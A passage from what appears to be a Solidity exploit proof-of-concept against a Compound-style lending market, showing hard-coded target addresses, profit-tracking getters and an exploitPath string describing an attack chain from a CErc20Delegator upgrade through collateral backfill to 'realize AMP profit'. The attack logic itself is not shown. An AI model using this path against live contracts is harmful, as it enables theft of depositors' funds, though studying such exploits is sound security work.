        if (index == 41) return address(uint160(0x00338286c0bc081891a4bda39c7667ae150bf5d206));
        if (index == 42) return address(uint160(0x00e11ba472f74869176652c35d30db89854b5ae84d));
        if (index == 43) return address(uint160(0x000391d2021f89dc339f60fff84546ea23e337750f));
        if (index == 44) return address(uint160(0x001f573d6fb3f13d689ff844b4ce37794d79a7ff1c));
        if (index == 45) return address(uint160(0x001c8645bec146ae9a3489fc5821b69c9191577331));
        if (index == 46) return address(uint160(0x0003ab458634910aad20ef5f1c8ee96f1d6ac54919));
        if (index == 47) return address(uint160(0x0057ab1ec28d129707052df4df418d58a2d46d5f51));
        return address(0);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "historical CErc20Delegator upgrade -> missing collateral migration -> legacy supplier touch via public V2 transfer when available, otherwise public in-market seizure touch -> uncapped collateral backfill -> realize AMP profit";
    }

    function exploitPathAt(uint256 index) external pure returns (string memory) {
        if (index == 0) {
            return PATH_0;
        }
        if (index == 1) {
            return PATH_1;
        }
        if (index == 2) {
            return PATH_2;
        }
        if (index == 3) {
            return PATH_3;
        }

        revert("path out of bounds");
    }
}
